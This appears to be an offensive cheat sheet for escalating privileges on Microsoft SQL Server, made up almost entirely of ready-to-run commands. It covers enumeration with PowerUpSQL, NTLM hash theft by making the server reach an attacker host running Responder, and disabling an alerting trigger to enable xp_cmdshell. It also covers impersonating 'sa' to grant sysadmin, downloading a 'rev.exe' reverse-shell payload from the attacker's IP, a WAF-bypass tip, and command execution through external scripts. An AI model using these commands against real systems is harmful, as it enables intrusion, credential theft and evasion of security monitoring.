---
title: "MSSQL Privilege Escalation"
date: 2024-6-27
tags: ["Hash Cracking", "Database Dumping", "Privilege Escalation In Databases", "Ntlm", "Mssql", "Database", "Windows", "RCE", "Enum"]
---

### Enum

```console
# Import Module
. .\PowerUpSQL.ps1
```

```console
# Audit
Invoke-SQLAudit -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Verbose
```

```console
# Execute Query
Get-SQLQuery -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Query "<QUERY>" -Verbose
```

<small>*Ref: [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1)*</small>

### Abuse #1: Steal NTLM hash

```console
# In our local Linux machine
sudo responder -I tun0
```

{{< tab set1 tab1 >}}Method 1{{< /tab >}}
{{< tab set1 tab2 >}}Method 2{{< /tab >}}
{{< tab set1 tab3 >}}Method 3{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
xp_dirtree '\\<LOCAL_IP>\any\thing';
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing';
```

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
load_file('\\<LOCAL_IP>\any\thing');
```

{{< /tabcontent >}}

### Abuse #2: Run xp_cmdshell

```console
# Check any policy blocking xp_cmdshell
select name from sys.server_triggers;
```

```console
# Disable trigger if any
disable trigger ALERT_xp_cmdshell on all server;
```

```console
# Enable xp_cmdshell
enable_xp_cmdshell;
```

```console
# RCE
xp_cmdshell whoami
```

### Abuse #3: Impersonate sa to run xp_cmdshell

```console
# Add user to sysadmin
execute as login = 'sa'; exec sp_addsrvrolemember '<USER>','sysadmin'
```

```console
# Check
SELECT is_srvrolemember('sysadmin');
```

```console
execute as login = 'sa'; exec sp_configure 'show advanced options', 1;
```

```console
execute as login = 'sa'; reconfigure;
```

```console
execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1;
```

```console
execute as login = 'sa'; reconfigure;
```

```console
execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass curl <LOCAL_IP>/rev.exe -o C:\ProgramData\rev.exe'
```

<small>*Note: try xp_cmDshElL to bypass WAF*</small>

### Abuse #4: Run External Script

```console
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("whoami");';
```
